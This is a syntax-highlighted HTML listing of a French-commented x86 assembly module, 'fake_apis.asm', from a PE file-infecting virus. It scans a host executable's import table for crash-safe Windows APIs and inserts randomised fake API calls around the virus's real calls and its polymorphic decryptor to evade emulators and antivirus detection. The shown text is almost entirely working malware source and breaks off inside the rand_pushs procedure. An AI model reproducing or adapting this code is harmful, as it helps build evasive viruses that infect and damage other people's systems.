<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>fake_apis.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;;; MODULE : FAKE_APIS</span><span class="sc0">
</span><span class="sc1">;;; AUTEUR : kaze &lt;kaze@lyua.org&gt;</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;; Ce module scanne l'import table d'un hote de type PE à la recherche de certaines</span><span class="sc0">
</span><span class="sc1">;;; apis. La liste des apis à chercher est formatée comme dans l'exemple ci-dessous</span><span class="sc0">
</span><span class="sc1">;;; (liste_fake_apis). Cette liste est de la forme:</span><span class="sc0">
</span><span class="sc1">;;;   - nom de la dll (en minuscules)</span><span class="sc0">
</span><span class="sc1">;;;   - couples (crc de l'api, nombre de paramètres de l'api)</span><span class="sc0">
</span><span class="sc1">;;;   - le tout x fois ...</span><span class="sc0">
</span><span class="sc1">;;;  Séparez deux dll par un FAKE_API_SEPARATEUR et terminez la liste par FAKE_API_FIN.</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;; Ce module m'a servi à chercher dans l'hote certaines apis "stables", i.e qui ne plantent</span><span class="sc0">
</span><span class="sc1">;;; pas peu importe ce qu'ont leur donne en entrée. Cela permet d'ajouter des "fake api calls"</span><span class="sc0">
</span><span class="sc1">;;; à un décrypteur polymorphique par exemple. D'où le fait qu'il faut renseigner dans la liste</span><span class="sc0">
</span><span class="sc1">;;; le nombre de paramètres de l'api, ca pourra servir plus tard. Ce module peut tout a fait</span><span class="sc0">
</span><span class="sc1">;;; servir à autre chose cependant.</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;; La fonction principale à appeler est find_fake_apis qui prend en entrée:</span><span class="sc0">
</span><span class="sc1">;;;   - esi--&gt;liste des crc des fake_apis à chercher formatée comme dans l'exemple</span><span class="sc0">
</span><span class="sc1">;;;   - edi--&gt;tableau qui contiendra la liste des adresses des apis en retour</span><span class="sc0">
</span><span class="sc1">;;;   - edx--&gt;pe header hote</span><span class="sc0">
</span><span class="sc1">;;;   - ebx = adresse où l'hote est filemappé</span><span class="sc0">
</span><span class="sc1">;;;   - ebp = delta offset</span><span class="sc0">
</span><span class="sc1">;;; elle fournit en sortie:</span><span class="sc0">
</span><span class="sc1">;;;   - le tableau passé dans edi est renseigné, et est composé d'une liste de doublons:</span><span class="sc0">
</span><span class="sc1">;;;      .dword : RVA de la future adresse (dans le FirsThunk de l'hote) de l'api.</span><span class="sc0">
</span><span class="sc1">;;;      .dword : nombre de paramètres de l'api</span><span class="sc0">
</span><span class="sc1">;;;   - le nombre d'apis trouvées dans eax</span><span class="sc0">
</span><span class="sc1">;;;Le tableau contient uniquement les futures RVA des adresses des apis QUI ONT ETE TROUVEES</span><span class="sc0">
</span><span class="sc1">;;;dans l'IAT de l'hote. Il ne contiendra donc pas forcément NB_FAKE_APIS doublons mais</span><span class="sc0">
</span><span class="sc1">;;;surement moins. Le tableau est terminé par le dword 0.</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;Il faut bien comprendre que cette fonction ne retourne pas les adresses des apis</span><span class="sc0">
</span><span class="sc1">;;;à l'instant t, mais l'adresse (la RVA exactement) dans le FT de l'hote où sera stockée</span><span class="sc0">
</span><span class="sc1">;;;l'adresse de l'api lorsque l'hote sera exécuté et que l'IAT aura été résolue par le</span><span class="sc0">
</span><span class="sc1">;;;loader windows.</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;;NB: faites attention que la tableau passé dans edi soit de taille suffisament grande</span><span class="sc0">
</span><span class="sc1">;;;pour stocker le résultat (taille de (NB_FAKE_APIS+1)*8 octets au max)</span><span class="sc0">



</span><span class="sc5">MAX_DYN_FAKE_APIS</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">


</span><span class="sc5">FAKE_API</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">crc</span><span class="sc4">,</span><span class="sc5">nb_params</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">crc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">nb_params</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">FAKE_API_SEPARATEUR</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">FAKE_API_FIN</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">sauve_reg_anti_call</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sauve_reg_anti_call2</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">



</span><span class="sc5">liste_fake_apis</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">fake_apis.inc</span><span class="sc0">
</span><span class="sc5">NB_FAKE_APIS</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc0">  </span><span class="sc1">; borne max</span><span class="sc0">


</span><span class="sc1">; variables temporaires, merci intel pour si peu de registres !</span><span class="sc0">
</span><span class="sc5">ffa_tab</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ffa_nb</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ffa_tmp1</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;FIND_FAKE_APIS : in : esi--&gt;list des crc des fake_apis possibles</span><span class="sc0">
</span><span class="sc1">;                      edi--&gt; tableau où stocker les adresses des api</span><span class="sc0">
</span><span class="sc1">;                      edx--&gt;pe header hote</span><span class="sc0">
</span><span class="sc1">;                      ebx = file mapping offset</span><span class="sc0">
</span><span class="sc1">;                 out: tableau rempli et eax=nb apis trouvées</span><span class="sc0">
</span><span class="sc5">find_fake_apis</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ffa_nb</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ffa_tab</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NB_FAKE_APIS</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;ecx--&gt; IAT de l'hote</span><span class="sc0">

</span><span class="sc5">ffa_cherche_iid</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">ffa_cherche_iid_boucle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ffa_finrecherche</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ffa_cmp_str</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">    </span><span class="sc1">; comparaison du dllname case-insensitive</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ffa_minuscule</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ffa_minuscule</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc4">-</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">ffa_minuscule</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ffa_cmp_faux</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ffa_iid_trouve</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ffa_cmp_str</span><span class="sc0">
</span><span class="sc5">ffa_cmp_faux</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; rerecherche au debut du nom</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ffa_cherche_iid_boucle</span><span class="sc0">
</span><span class="sc5">ffa_iid_trouve</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; passe à la liste des FAKE_API</span><span class="sc0">

</span><span class="sc5">ffa_trouve_api</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ffa_fin_iid</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ffa_finrecherche</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; OFT</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ffa_oftpresent</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ffa_oftpresent</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ffa_tmp1</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">ffa_cherche_api</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; boucle pour chaque api  importee</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ffa_pas_trouve</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ffa_cherche_api</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calc_crc</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ffa_cherche_api</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ffa_tmp1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; eax=pointeur vers la future RVA de l'api</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ffa_tab</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ffa_place_libre</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ffa_libre</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ffa_place_libre</span><span class="sc0">
</span><span class="sc5">ffa_libre</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ffa_nb</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ffa_pas_trouve</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ffa_trouve_api</span><span class="sc0">
</span><span class="sc5">ffa_fin_iid</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ffa_cherche_iid</span><span class="sc0">
</span><span class="sc5">ffa_finrecherche</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ffa_nb</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">find_fake_apis</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc5">anti_call_init</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fa_xor_loop</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xor_loop_location</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">XOR_LOOP_SIZE</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">anti_call_init</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;ANTI_CALL</span><span class="sc0">
</span><span class="sc1">; in: edx=adresse à appeler</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Appel d'une API au sein du corps du virus :</span><span class="sc0">
</span><span class="sc1">; appel de MAX_DYN_FAKE_APIS fake API</span><span class="sc0">
</span><span class="sc1">; appel de l'API en question</span><span class="sc0">
</span><span class="sc1">; appel de MAX_DYN_FAKE_APIS fake API</span><span class="sc0">
</span><span class="sc5">anti_call</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">appel_fake_apis</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xor_loop_location</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">anti_call_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">xor_loop_location</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">anti_call_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">appel_fake_apis</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cle_anti_call</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">anti_call</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;appel_fake_apis</span><span class="sc0">
</span><span class="sc1">; in: none</span><span class="sc0">
</span><span class="sc1">; out:none</span><span class="sc0">
</span><span class="sc1">;appelle MAX_DYN_FAKE_APIS API avec les paramètres qui vont bient</span><span class="sc0">
</span><span class="sc5">appel_fake_apis</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MAX_DYN_FAKE_APIS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_tuna</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">cfa_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sauve_fake_apis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">taille_liste</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cfa_2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_tuna</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cfa_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_pushs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sauve_imagebase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">cfa_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cfa_1</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">appel_fake_apis</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">rand_pushs</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">    </span><span class="sc1">;in: eax= nb de pushs</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">rp_2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">rp_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_tuna</span><span class="sc0">
